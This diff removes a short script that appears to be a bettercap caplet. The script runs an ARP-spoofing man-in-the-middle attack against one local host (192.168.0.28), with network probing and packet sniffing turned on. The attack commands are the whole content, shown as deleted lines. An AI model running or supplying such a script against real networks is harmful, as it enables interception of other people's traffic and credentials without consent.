@@ -1,7 +1,0 @@
-net.probe on
-set arp.spoof.fullduplex true
-set arp.spoof.targets 192.168.0.28
-set net.sniff.local true
-arp.spoof on
-net.sniff on
-
